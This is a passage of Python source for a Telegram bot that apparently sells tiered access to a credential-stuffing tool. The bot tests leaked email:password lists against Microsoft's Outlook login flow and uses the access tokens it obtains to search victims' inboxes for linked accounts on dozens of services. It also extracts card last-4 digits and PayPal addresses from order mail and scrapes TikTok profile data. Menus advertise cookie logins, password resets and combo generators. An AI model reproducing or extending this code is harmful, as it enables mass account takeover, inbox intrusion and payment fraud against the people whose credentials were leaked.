        last_scan = datetime.datetime.strptime(user[6], "%Y-%m-%d %H:%M:%S")
        now = datetime.datetime.now()
        diff = (now - last_scan).total_seconds()

        if diff >= 3600:
            return True, None
        else:
            remaining = int(3600 - diff)
            minutes = remaining // 60
            seconds = remaining % 60
            return False, f"{minutes}m {seconds}s"
    except:
        return True, None

def update_last_scan(user_id):
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE users SET last_scan_time = ? WHERE user_id = ?", 
              (str(datetime.datetime.now()), user_id))
    conn.commit()
    conn.close()

def add_vip(user_id, username, duration):
    """Add VIP membership"""
    conn = get_db()
    c = conn.cursor()

    user = get_user(user_id)
    if not user:
        add_user(user_id, username)

    if duration == "Forever" or duration == "forever":
        vip_until = "Forever"
    else:
        now = datetime.datetime.now()
        if duration == "1h":
            vip_until = now + datetime.timedelta(hours=1)
        elif duration == "1d":
            vip_until = now + datetime.timedelta(days=1)
        elif duration == "3d":
            vip_until = now + datetime.timedelta(days=3)
        elif duration == "1w":
            vip_until = now + datetime.timedelta(weeks=1)
        elif duration == "1m":
            vip_until = now + datetime.timedelta(days=30)
        else:
            vip_until = "Forever"

        if vip_until != "Forever":
            vip_until = vip_until.strftime("%Y-%m-%d %H:%M:%S")

    c.execute("UPDATE users SET is_vip = 1, vip_until = ? WHERE user_id = ?", 
              (vip_until, user_id))
    conn.commit()
    conn.close()
    invalidate_vip_cache(user_id)
    try:
        membership = "Forever" if vip_until == "Forever" else "VIP"
        # If user not in JSON yet, create their record first
        if not get_json_user(user_id):
            add_json_user(user_id, username, username)
        update_json_user(user_id, is_vip=True, vip_until=vip_until, membership=membership)
    except Exception:
        pass

def remove_vip(user_id):
    """Remove VIP (updates both SQLite and JSON)"""
    conn = get_db()
    c = conn.cursor()
    c.execute("UPDATE users SET is_vip = 0, vip_until = NULL WHERE user_id = ?", (user_id,))
    conn.commit()
    conn.close()
    invalidate_vip_cache(user_id)
    try:
        update_json_user(user_id, is_vip=False, vip_until=None, membership="Free")
    except Exception:
        pass

def get_all_vips():
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT user_id, username, vip_until FROM users WHERE is_vip = 1")
    vips = c.fetchall()
    conn.close()
    return vips

def get_free_users():
    """Get list of free users"""
    conn = get_db()
    c = conn.cursor()
    c.execute("SELECT user_id, username FROM users WHERE is_vip = 0 AND is_banned = 0")
    free_users = c.fetchall()
    conn.close()
    return free_users

def update_stats(user_id, hits, bad, total, scan_mode="standard"):
    conn = get_db()
    c = conn.cursor()

    c.execute("UPDATE users SET total_scans = total_scans + 1, total_hits = total_hits + ? WHERE user_id = ?", 
              (hits, user_id))

    c.execute("INSERT INTO scans (user_id, scan_date, scan_mode, hits_count, bad_count, total_checked) VALUES (?, ?, ?, ?, ?, ?)",
              (user_id, datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'), scan_mode, hits, bad, total))

    conn.commit()
    conn.close()

def main_menu_keyboard(user_id):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)

    _is_admin   = (user_id == ADMIN_ID)
    _has_access = _is_admin or is_vip(user_id)

    # ── Base buttons (everyone) ──────────────────────────────────────────
    btn1       = types.KeyboardButton(t(user_id, "btn_start_scan"))
    btn2       = types.KeyboardButton(t(user_id, "btn_multi_scan"))
    btn3       = types.KeyboardButton(t(user_id, "btn_my_stats"))
    btn4       = types.KeyboardButton(t(user_id, "btn_membership"))
    btn5       = types.KeyboardButton(t(user_id, "btn_referral"))
    btn6       = types.KeyboardButton(t(user_id, "btn_support"))
    btn_redeem = types.KeyboardButton("🔑 Redeem Key")
    btn_reload = types.KeyboardButton(t(user_id, "btn_reload"))
    btn_lang   = types.KeyboardButton(t(user_id, "btn_language"))

    all_btns = [btn1, btn2, btn3, btn4, btn5, btn6, btn_redeem, btn_lang, btn_reload]

    # ── VIP / Admin-only buttons ─────────────────────────────────────────
    if _has_access:
        btn_cleaner      = types.KeyboardButton(t(user_id, "btn_combo_cleaner"))
        btn_mailcheck    = types.KeyboardButton(t(user_id, "btn_mail_extractor"))
        btn_inbox_single = types.KeyboardButton(t(user_id, "btn_single_inbox"))
        btn_inbox_multi  = types.KeyboardButton(t(user_id, "btn_multi_inbox"))
        btn_ryd          = types.KeyboardButton("🚗 RYD Inboxen")
        btn_limehome     = types.KeyboardButton("🏨 Limehome Inboxen")
        btn_amazon       = types.KeyboardButton("📦 Amazon Inboxen")
        btn_paypal       = types.KeyboardButton("💰 PayPal Inboxen")
        btn_uber         = types.KeyboardButton("🚕 Uber Inboxen")
        btn_lieferando   = types.KeyboardButton("🍕 Lieferando Inboxen")
        btn_booking      = types.KeyboardButton("✈️ Booking Inboxen")
        btn_zalando      = types.KeyboardButton("👗 Zalando Inboxen")
        btn_lime         = types.KeyboardButton("🛴 Lime Inboxen")
        btn_payback      = types.KeyboardButton("💳 PAYBACK Inboxen")
        btn_db           = types.KeyboardButton("🚆 DB Inboxen")
        btn_dhl          = types.KeyboardButton("📦 DHL Inboxen")
        btn_otto         = types.KeyboardButton("🛒 Otto Inboxen")
        btn_ebay         = types.KeyboardButton("🏷️ eBay Inboxen")
        btn_netflix_count     = types.KeyboardButton("🎬 Netflix Inbox Count")
        btn_netflix_checker   = types.KeyboardButton("🎬 Netflix Checker")
        btn_netflix_pass_reset= types.KeyboardButton("🔑 Netflix Pass Reset")
        btn_spotify_premium   = types.KeyboardButton("🎵 Spotify Premium Inbox")
        btn_crunchyroll  = types.KeyboardButton("🍥 Crunchyroll Inboxen")
        btn_spotify      = types.KeyboardButton("🎵 Spotify Inboxen")
        btn_psn          = types.KeyboardButton("🎮 PSN Inboxen")
        btn_steam        = types.KeyboardButton("💻 Steam Inboxen")
        btn_efootball    = types.KeyboardButton("⚽ eFootball Inboxen")
        btn_tiktok_inbox     = types.KeyboardButton("🎵 TikTok Inboxen")
        btn_tiktok_1k        = types.KeyboardButton("🎵 TikTok 1K+ Inboxen")
        btn_instagram_inbox  = types.KeyboardButton("📸 Instagram Inboxen")
        btn_supercell_inbox  = types.KeyboardButton("⚔️ Supercell Inboxen")
        btn_check24      = types.KeyboardButton("✅ Check24 Inboxen")
        btn_shein        = types.KeyboardButton("👠 SHEIN Inboxen")
        btn_flixbus      = types.KeyboardButton("🚌 FlixBus Inboxen")
        btn_flaschenpost = types.KeyboardButton("🍾 Flaschenpost Inboxen")
        btn_mcdonalds    = types.KeyboardButton("🍔 McDonald's Inboxen")
        btn_combogen     = types.KeyboardButton(t(user_id, "btn_combo_gen"))
        btn_history         = types.KeyboardButton(t(user_id, "btn_scan_history"))
        btn_cleaner2        = types.KeyboardButton(t(user_id, "btn_combo_cleaner"))
        btn_vpn_inbox       = types.KeyboardButton("🔒 VPN Inboxen")
        btn_hosting_inbox   = types.KeyboardButton("🌐 Hosting Inboxen")
        btn_aws_inbox       = types.KeyboardButton("☁️ AWS Inboxen")
        btn_instagram_chk   = types.KeyboardButton("📸 Instagram Checker")
        btn_tiktok_chk      = types.KeyboardButton("🎵 TikTok Checker")
        btn_netflix_cookie  = types.KeyboardButton("🍿 Netflix Cookie Login")
        btn_amazon_cookie   = types.KeyboardButton("📦 Amazon Cookie Login")
        btn_hbomax_cookie   = types.KeyboardButton("🎬 HBO Max Cookie Login")

        btn_all_scan = types.KeyboardButton("⚡ All Scan")

        all_btns += [
            btn_all_scan,
            btn_cleaner, btn_mailcheck,
            btn_inbox_single, btn_inbox_multi,
            btn_ryd, btn_limehome, btn_lime, btn_amazon, btn_paypal, btn_uber,
            btn_lieferando, btn_booking, btn_zalando, btn_payback, btn_db,
            btn_dhl, btn_otto, btn_ebay,
            btn_netflix_count, btn_netflix_checker, btn_netflix_pass_reset,
            btn_netflix_cookie, btn_amazon_cookie, btn_hbomax_cookie,
            btn_psn, btn_steam, btn_efootball,
            btn_tiktok_inbox, btn_tiktok_1k, btn_tiktok_chk, btn_instagram_inbox, btn_instagram_chk,
            btn_supercell_inbox,
            btn_vpn_inbox, btn_hosting_inbox, btn_aws_inbox,
            btn_crunchyroll, btn_spotify, btn_spotify_premium,
            btn_check24, btn_shein, btn_flixbus, btn_flaschenpost, btn_mcdonalds,
            btn_combogen, btn_history,
        ]

    # ── Admin-only extra ─────────────────────────────────────────────────
    if _is_admin:
        btn_netflix = types.KeyboardButton("🎬 Netflix Premium ★")
        btn7 = types.KeyboardButton(t(user_id, "btn_admin"))
        all_btns.append(btn_netflix)
        all_btns.append(btn7)

    markup.add(*all_btns)

    return markup

# Scan Mode Selection
def scan_mode_keyboard(user_id):
    """Enhanced scan mode with Check One Account and Instagram Full"""
    markup = types.InlineKeyboardMarkup(row_width=1)

    btn1 = types.InlineKeyboardButton("1️⃣ All Services", callback_data="scan_all")
    btn2 = types.InlineKeyboardButton("2️⃣ Select Single Platform", callback_data="scan_single_platform")
    btn3 = types.InlineKeyboardButton("3️⃣ Gaming Platforms", callback_data="scan_gaming")
    btn4 = types.InlineKeyboardButton("4️⃣ Social Media", callback_data="scan_social")
    btn5 = types.InlineKeyboardButton("5️⃣ Streaming Services", callback_data="scan_streaming")
    btn6 = types.InlineKeyboardButton("6️⃣ PSN Detailed", callback_data="scan_psn")
    btn7 = types.InlineKeyboardButton("7️⃣ Custom Domain", callback_data="scan_custom")
    btn8 = types.InlineKeyboardButton("8️⃣ AI Platforms (Free)", callback_data="scan_ai")

    # TikTok Full Capture - VIP FOREVER Only
    if is_vip_forever(user_id):
        btn9 = types.InlineKeyboardButton("9️⃣ TikTok Full Capture (VIP Forever)", callback_data="scan_tiktok")
    else:
        btn9 = types.InlineKeyboardButton("🔒 TikTok Full (VIP Forever Only)", callback_data="vip_forever_required")

    # NEW: Check One Account
    btn10 = types.InlineKeyboardButton("🔟 Check One Account", callback_data="scan_check_one")

    # NEW: Instagram Full Capture - VIP only
    if is_vip(user_id):
        btn11 = types.InlineKeyboardButton("1️⃣1️⃣ Instagram Full Capture (VIP)", callback_data="scan_instagram_full")
    else:
        btn11 = types.InlineKeyboardButton("🔒 Instagram Full (VIP Only)", callback_data="vip_required")

    btn12 = types.InlineKeyboardButton("🛍️ Shopping (Shein & mehr)", callback_data="scan_shopping")

    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9, btn10, btn11, btn12)

    btn_back = types.InlineKeyboardButton("◀️ Back", callback_data="back_main")
    markup.add(btn_back)

    return markup


def single_platform_keyboard():
    """Platform selection keyboard - ALL platforms from source"""
    markup = types.InlineKeyboardMarkup(row_width=3)

    # Get ALL unique platforms from all service categories
    all_platforms = {}

    # Add from SERVICES_ALL
    for name, email in SERVICES_ALL.items():
        all_platforms[name] = email

    # Add from SERVICES_GAMING (if not already present)
    for name, email in SERVICES_GAMING.items():
        if name not in all_platforms:
            all_platforms[name] = email

    # Add from SERVICES_SOCIAL
    for name, email in SERVICES_SOCIAL.items():
        if name not in all_platforms:
            all_platforms[name] = email

    # Add from SERVICES_STREAMING
    for name, email in SERVICES_STREAMING.items():
        if name not in all_platforms:
            all_platforms[name] = email

    # Add from SERVICES_AI
    for name, email in SERVICES_AI.items():
        if name not in all_platforms:
            all_platforms[name] = email

    # Add from SERVICES_SHOPPING
    for name, email in SERVICES_SHOPPING.items():
        if name not in all_platforms:
            all_platforms[name] = email

    # Create buttons for all platforms (sorted alphabetically)
    platform_buttons = []
    for platform_name in sorted(all_platforms.keys()):
        # Create simple button with platform name
        btn_text = platform_name
        btn_data = f"platform_{platform_name}"
        platform_buttons.append(types.InlineKeyboardButton(btn_text, callback_data=btn_data))

    # Add buttons in rows of 3
    for i in range(0, len(platform_buttons), 3):
        row = platform_buttons[i:i+3]
        markup.row(*row)

    # Back button
    back_btn = types.InlineKeyboardButton("◀️ Back", callback_data="back_to_scan_modes")
    markup.add(back_btn)

    return markup

def get_mode_description(mode):
    """Get detailed description for each scan mode"""
    descriptions = {
        "all": """
⚡ <b>ALL SERVICES SCAN</b>

📝 <b>Description:</b>
Check ALL linked accounts across 60+ platforms

🎯 <b>Supported Platforms:</b>
• 📱 Social: Facebook, Instagram, TikTok, Twitter, LinkedIn
• 🎮 Gaming: Steam, Xbox, PSN, Epic, Free Fire, PUBG, Konami
• 📺 Streaming: Netflix, Spotify, Disney+, Hulu, HBO Max
• 💰 Finance: PayPal, Binance, Coinbase
• And 40+ more!

⏱ <b>Estimated Time:</b> Medium-Long
🎯 <b>Best For:</b> Complete account analysis
""",
        "gaming": """
⚡ <b>GAMING PLATFORMS SCAN</b>

📝 <b>Description:</b>
Check gaming accounts only - faster & focused

🎮 <b>Supported Platforms:</b>
• Steam, Xbox, PlayStation, Epic Games
• EA Sports, Ubisoft, Riot Games
• Roblox, Minecraft
• Free Fire, PUBG Mobile, Konami

⏱ <b>Estimated Time:</b> Fast
🎯 <b>Best For:</b> Gaming account hunters
""",
        "social": """
⚡ <b>SOCIAL MEDIA SCAN</b>

📝 <b>Description:</b>
Check social media accounts only

📱 <b>Supported Platforms:</b>
• Facebook, Instagram, TikTok
• Twitter, LinkedIn, Snapchat
• Discord, Reddit

⏱ <b>Estimated Time:</b> Fast
🎯 <b>Best For:</b> Social media hunters
""",
        "streaming": """
⚡ <b>STREAMING SERVICES SCAN</b>

📝 <b>Description:</b>
Check streaming & entertainment

📺 <b>Supported Platforms:</b>
• Netflix, Spotify, Disney+
• Hulu, HBO Max, Amazon Prime
• YouTube Premium, Twitch

⏱ <b>Estimated Time:</b> Fast
🎯 <b>Best For:</b> Entertainment hunters
""",
        "psn": """
⚡ <b>PSN DETAILED SCAN</b>

📝 <b>Description:</b>
Deep PlayStation Network analysis

🎯 <b>What You Get:</b>
• PSN verification
• Order history
• Online ID extraction
• Account region

⏱ <b>Estimated Time:</b> Medium
🎯 <b>Best For:</b> PlayStation focus
""",
        "custom": """
⚡ <b>CUSTOM DOMAIN SCAN</b>

📝 <b>Description:</b>
Search for ANY service by domain

🔍 <b>How It Works:</b>
Provide domain (e.g., netflix.com)
Bot searches emails from that domain

⏱ <b>Estimated Time:</b> Fast
🎯 <b>Best For:</b> Specific services
""",
        "ai": """
⚡ <b>AI PLATFORMS SCAN</b> 🆕

📝 <b>Description:</b>
Check AI platform accounts (FREE!)

🤖 <b>Supported Platforms:</b>
• ChatGPT (OpenAI)
• Claude AI (Anthropic)
• Gemini (Google)
• DeepSeek AI
• Blackbox AI
• Perplexity AI
• Meta AI (LLaMA)
• Microsoft Copilot
• Stability AI

⏱ <b>Estimated Time:</b> Fast
🎯 <b>Best For:</b> AI account hunters
💎 <b>Status:</b> FREE for everyone!
""",
        "tiktok": """
⚡ <b>TIKTOK FULL CAPTURE</b> 🆕

📝 <b>Description:</b>
Complete TikTok account data extraction

🎯 <b>What You Get:</b>
• TikTok Username
• Followers Count
• Following Count
• Total Videos
• Total Likes
• Profile Bio
• Verification Status
• Account Creation Date

⏱ <b>Estimated Time:</b> Medium
🎯 <b>Best For:</b> TikTok hunters
👑 <b>Status:</b> VIP ONLY
""",
        "shopping": """
⚡ <b>SHOPPING SCAN</b> 🆕

📝 <b>Description:</b>
Check shopping platform accounts

🛍️ <b>Supported Platforms:</b>
• Shein (noreply@sheinnotice.com)
• Amazon Prime
• eBay
• AliExpress

⏱ <b>Estimated Time:</b> Fast
🎯 <b>Best For:</b> Shopping account hunters
"""
    }

    return descriptions.get(mode, "")

# Admin Panel
def admin_panel_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)

    # VIP Management
    btn1 = types.InlineKeyboardButton("➕ Add VIP", callback_data="admin_add_vip")
    btn2 = types.InlineKeyboardButton("➖ Remove VIP", callback_data="admin_remove_vip")
    btn3 = types.InlineKeyboardButton("📋 List VIPs", callback_data="admin_list_vips")

    # Ban Management
    btn4 = types.InlineKeyboardButton("🚫 Ban User", callback_data="admin_ban_user")
    btn5 = types.InlineKeyboardButton("✅ Unban User", callback_data="admin_unban_user")
    btn6 = types.InlineKeyboardButton("📋 Banned List", callback_data="admin_banned_list")

    btn7 = types.InlineKeyboardButton("📊 Bot Stats", callback_data="admin_stats")
    btn8 = types.InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")
    btn9 = types.InlineKeyboardButton("🔑 Generate Key", callback_data="admin_generate_key")
    btn_userstats = types.InlineKeyboardButton("👤 User Stats", callback_data="admin_user_stats")
    btn_topusers = types.InlineKeyboardButton("🏆 Top Users", callback_data="admin_top_users")
    btn_maintenance = types.InlineKeyboardButton("🔧 Maintenance Mode", callback_data="admin_maintenance")
    btn_groups = types.InlineKeyboardButton("👥 Groups", callback_data="admin_groups")
    btn_userlog = types.InlineKeyboardButton("📋 User Logs", callback_data="admin_user_logs")
    btn_active_scans = types.InlineKeyboardButton("🔍 Active Scans", callback_data="admin_active_scans")
    btn_force_join   = types.InlineKeyboardButton("📢 Force Join", callback_data="admin_force_join")
    btn_back = types.InlineKeyboardButton("◀️ Back", callback_data="back_main")

    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9, btn_userstats, btn_topusers, btn_maintenance, btn_groups, btn_userlog, btn_active_scans, btn_force_join, btn_back)
    return markup

# VIP Duration Selection
def vip_duration_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)

    btn1 = types.InlineKeyboardButton("⏱ 1 Hour", callback_data="vip_duration_1h")
    btn2 = types.InlineKeyboardButton("📅 1 Day", callback_data="vip_duration_1d")
    btn3 = types.InlineKeyboardButton("📆 1 Week", callback_data="vip_duration_1w")
    btn4 = types.InlineKeyboardButton("🗓 1 Month", callback_data="vip_duration_1m")
    btn5 = types.InlineKeyboardButton("♾️ Forever", callback_data="vip_duration_forever")
    btn_back = types.InlineKeyboardButton("◀️ Cancel", callback_data="admin_panel")

    markup.add(btn1, btn2, btn3, btn4, btn5, btn_back)
    return markup

# Stop Button for Progress Message
def stop_scan_keyboard(user_id):
    markup = types.InlineKeyboardMarkup()
    btn_stop = types.InlineKeyboardButton("⏹ Stop Scan", callback_data=f"stop_scan_{user_id}")
    markup.add(btn_stop)
    return markup

# =====================================================
# HOTMAIL CHECKER ENGINE
# =====================================================

class HotmailChecker:
    """Real Hotmail/Outlook Checker"""
    _idp_cache = {}
    _idp_lock = threading.Lock()

    @staticmethod
    def _is_ms_domain(email):
        """Cache IDP lookup per domain — avoids repeat API calls for same domain."""
        domain = email.lower().split("@")[-1] if "@" in email else ""
        with HotmailChecker._idp_lock:
            if domain in HotmailChecker._idp_cache:
                return HotmailChecker._idp_cache[domain]
        try:
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            r1 = requests.get(url1, headers={
                "X-OneAuth-AppName": "Outlook Lite",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N)",
            }, timeout=5)
            result = "MSAccount" in r1.text
        except Exception:
            result = True  # assume MS on error, let login decide
        with HotmailChecker._idp_lock:
            HotmailChecker._idp_cache[domain] = result
        return result

    @staticmethod
    def check_account(email, password):
        """Check if account is valid"""
        for _attempt in range(2):
            try:
                if not HotmailChecker._is_ms_domain(email):
                    return {"status": "BAD"}

                session = requests.Session()

                params = {
                    "client_info": "1",
                    "haschrome": "1",
                    "login_hint": email,
                    "mkt": "en",
                    "response_type": "code",
                    "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                    "scope": "profile openid offline_access https://outlook.office.com/M365.Access",
                    "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"
                }

                url_auth = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?{urllib.parse.urlencode(params)}"
                r2 = session.get(url_auth, timeout=6)

                url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
                ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)

                if not url_match or not ppft_match:
                    ppft_match2 = re.search(r'value="([^"]{100,})"', r2.text)
                    if not url_match or not ppft_match2:
                        return {"status": "BAD"}
                    ppft = ppft_match2.group(1)
                    post_url = url_match.group(1).replace("\\/", "/") if url_match else ""
                else:
                    post_url = url_match.group(1).replace("\\/", "/")
                    ppft = ppft_match.group(1)

                login_data = {
                    "i13": "1",
                    "login": email,
                    "loginfmt": email,
                    "type": "11",
                    "LoginOptions": "1",
                    "passwd": password,
                    "ps": "2",
                    "PPFT": ppft,
                    "PPSX": "PassportR",
                    "i19": "9960"
                }

                r3 = session.post(post_url, data=login_data, headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0"
                }, allow_redirects=False, timeout=7)

                if "password is incorrect" in r3.text.lower() or "sErrTxt" in r3.text or "incorrect" in r3.text.lower():
                    return {"status": "BAD"}

                location = r3.headers.get("Location", "")
                if not location or "code=" not in location:
                    if "Location" not in r3.headers:
                        return {"status": "BAD"}
                    return {"status": "BAD"}

                code_match = re.search(r'code=([^&]+)', location)
                if not code_match:
                    return {"status": "BAD"}

                code = code_match.group(1)

                token_data = {
                    "client_info": "1",
                    "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                    "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                    "grant_type": "authorization_code",
                    "code": code,
                    "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
                }

                r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                                data=token_data, timeout=7)

                if "access_token" not in r4.text:
                    return {"status": "BAD"}

                token_json = r4.json()
                access_token = token_json["access_token"]

                mspcid = None
                for cookie in session.cookies:
                    if cookie.name == "MSPCID":
                        mspcid = cookie.value.upper()
                        break

                if not mspcid:
                    mspcid = str(uuid.uuid4()).upper()

                return {
                    "status": "HIT",
                    "token": access_token,
                    "cid": mspcid
                }

            except Exception:
                if _attempt < 1:
                    time.sleep(0.3)
                    continue
                return {"status": "RETRY"}

    @staticmethod
    def check_services(email, password, token, cid, services_dict):
        """Check for linked services - parallel execution"""
        found_services = []
        found_lock = threading.Lock()

        search_url = "https://outlook.live.com/search/api/v2/query"
        headers = {
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json",
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "Host": "substrate.office.com"
        }

        def check_one_service(service_name, sender_email):
            try:
                payload = {
                    "Cvid": str(uuid.uuid4()),
                    "Scenario": {"Name": "owa.react"},
                    "TimeZone": "UTC",
                    "TextDecorations": "Off",
                    "EntityRequests": [{
                        "EntityType": "Conversation",
                        "ContentSources": ["Exchange"],
                        "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                        "From": 0,
                        "Query": {"QueryString": f"from:{sender_email}"},
                        "Size": 1,
                        "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                    }]
                }
                r = requests.post(search_url, json=payload, headers=headers, timeout=3)
                if r.status_code == 200:
                    data = r.json()
                    if 'EntitySets' in data:
                        for entity_set in data['EntitySets']:
                            if 'ResultSets' in entity_set:
                                for result_set in entity_set['ResultSets']:
                                    if result_set.get('Total', 0) > 0:
                                        with found_lock:
                                            found_services.append(service_name)
                                        return
            except:
                pass

        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
                futures = [
                    executor.submit(check_one_service, name, email_addr)
                    for name, email_addr in services_dict.items()
                ]
                concurrent.futures.wait(futures, timeout=5)
        except:
            pass

        return found_services

    @staticmethod
    def check_shein_payment(email, password, token, cid):
        """Check Shein payment methods by searching inbox for order/payment emails"""
        payment_info = {"methods": [], "raw": "No Payment Method"}
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"
            headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Accept": "application/json",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}",
            }

            for query_str in ["from:noreply@sheinnotice.com payment", "from:noreply@sheinnotice.com order confirmation", "from:noreply@shein.com"]:
                payload = {
                    "Cvid": str(uuid.uuid4()),
                    "Scenario": {"Name": "owa.react"},
                    "TimeZone": "UTC",
                    "TextDecorations": "Off",
                    "EntityRequests": [{
                        "EntityType": "Message",
                        "ContentSources": ["Exchange"],
                        "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                        "From": 0,
                        "Query": {"QueryString": query_str},
                        "Size": 5,
                        "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                    }]
                }

                r = requests.post(search_url, json=payload, headers=headers, timeout=5)
                if r.status_code == 200:
                    data = r.json()
                    if 'EntitySets' in data:
                        for entity_set in data['EntitySets']:
                            if 'ResultSets' in entity_set:
                                for result_set in entity_set['ResultSets']:
                                    results = result_set.get('Results', [])
                                    for result in results:
                                        preview = result.get('Preview', '') or ''
                                        subject = result.get('Subject', '') or ''
                                        body_text = (preview + " " + subject).lower()

                                        import re as _re
                                        visa_match = _re.search(r'visa[^\d]*(\d{4})', body_text)
                                        mc_match = _re.search(r'mastercard[^\d]*(\d{4})', body_text)
                                        amex_match = _re.search(r'amex[^\d]*(\d{4})', body_text)
                                        card_match = _re.search(r'card[^\d]*(?:ending|last\s*4)[^\d]*(\d{4})', body_text)
                                        generic_card = _re.search(r'(?:credit|debit)\s*card[^\d]*(\d{4})', body_text)
                                        last4_match = _re.search(r'\*{4,}\s*(\d{4})', body_text) or _re.search(r'x{4,}(\d{4})', body_text)
                                        paypal_match = 'paypal' in body_text
                                        paypal_email_match = _re.search(r'paypal[^@]*?([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', body_text)
                                        klarna_match = 'klarna' in body_text
                                        applepay_match = 'apple pay' in body_text
                                        googlepay_match = 'google pay' in body_text
                                        afterpay_match = 'afterpay' in body_text or 'clearpay' in body_text

                                        if visa_match and f"Visa ****{visa_match.group(1)}" not in payment_info["methods"]:
                                            payment_info["methods"].append(f"Visa ****{visa_match.group(1)}")
                                        if mc_match and f"Mastercard ****{mc_match.group(1)}" not in payment_info["methods"]:
                                            payment_info["methods"].append(f"Mastercard ****{mc_match.group(1)}")
                                        if amex_match and f"Amex ****{amex_match.group(1)}" not in payment_info["methods"]:
                                            payment_info["methods"].append(f"Amex ****{amex_match.group(1)}")
                                        if card_match and f"Card ****{card_match.group(1)}" not in payment_info["methods"]:
                                            payment_info["methods"].append(f"Card ****{card_match.group(1)}")
                                        if generic_card and f"Card ****{generic_card.group(1)}" not in payment_info["methods"]:
                                            payment_info["methods"].append(f"Card ****{generic_card.group(1)}")
                                        if last4_match and not (visa_match or mc_match or amex_match or card_match or generic_card):
                                            entry = f"Card ****{last4_match.group(1)}"
                                            if entry not in payment_info["methods"]:
                                                payment_info["methods"].append(entry)

                                        if paypal_match and not any("PayPal" in m for m in payment_info["methods"]):
                                            if paypal_email_match:
                                                payment_info["methods"].append(f"PayPal ({paypal_email_match.group(1)})")
                                            else:
                                                payment_info["methods"].append("PayPal")

                                        if klarna_match and "Klarna" not in payment_info["methods"]:
                                            payment_info["methods"].append("Klarna")
                                        if applepay_match and "Apple Pay" not in payment_info["methods"]:
                                            payment_info["methods"].append("Apple Pay")
                                        if googlepay_match and "Google Pay" not in payment_info["methods"]:
                                            payment_info["methods"].append("Google Pay")
                                        if afterpay_match and "Afterpay/Clearpay" not in payment_info["methods"]:
                                            payment_info["methods"].append("Afterpay/Clearpay")

            if payment_info["methods"]:
                payment_info["raw"] = " | ".join(payment_info["methods"])

        except Exception as e:
            print(f"[Shein Payment Check] Error: {e}")

        return payment_info

    @staticmethod
    def check_tiktok_full(email, password, token, cid):
        """TikTok Full Capture - Extract COMPLETE TikTok data"""
        try:
            search_url = "https://outlook.live.com/search/api/v2/query"

            headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Accept": "application/json",
                "Authorization": f"Bearer {token}",
                "X-AnchorMailbox": f"CID:{cid}",
            }

            # Search for TikTok emails
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Message",
                    "ContentSources": ["Exchange"],
                    "Filter": {
                        "Or": [
                            {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
                            {"Term": {"DistinguishedFolderName": "DeletedItems"}}
                        ]
                    },
                    "From": 0,
                    "Query": {"QueryString": "tiktok"},
                    "Size": 25,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }

            r = requests.post(search_url, json=payload, headers=headers, timeout=6)

            if r.status_code != 200:
                return None

            search_text = r.text

            # Count TikTok emails
            tiktok_senders = [
                "no-reply@shop.tiktok.com",
                "notification@service.tiktok.com",
                "noreply@account.tiktok.com",
                "register@account.tiktok.com",
                "no-reply@tiktok.com",
            ]

            tiktok_count = 0
            for sender in tiktok_senders:
                tiktok_count += search_text.count(sender)

            if tiktok_count == 0:
                return None

            # Extract username from emails
            username_patterns = [
                r'(?i)this\s+email\s+was\s+generated\s+for\s+@?([a-zA-Z0-9_\.]{2,30})',
                r'(?i)Hi\s+@?([a-zA-Z0-9_\.]{2,30})',
                r'(?i)Hello\s+@?([a-zA-Z0-9_\.]{2,30})',
                r'@([a-zA-Z0-9_\.]{2,30})',
            ]

            username = None
            for pattern in username_patterns:
                match = re.search(pattern, search_text)
                if match:
                    potential_username = match.group(1)
                    if not any(x in potential_username.lower() for x in ['tiktok', 'mail', 'email', 'hotmail', 'outlook']):
                        username = potential_username
                        break

            if not username:
                return {
                    "has_tiktok": True,
                    "tiktok_emails": tiktok_count,
                    "username": "Unknown",
                    "followers": 0,
                    "following": 0,
                    "videos": 0,
                    "likes": 0,
                    "verified": False,
                    "bio": "",
                    "country": "",
                    "private": False,
                    "profile_pic": "",
                    "created": "N/A",
                }

            # Fetch TikTok profile data
            profile_data = {
                "has_tiktok": True,
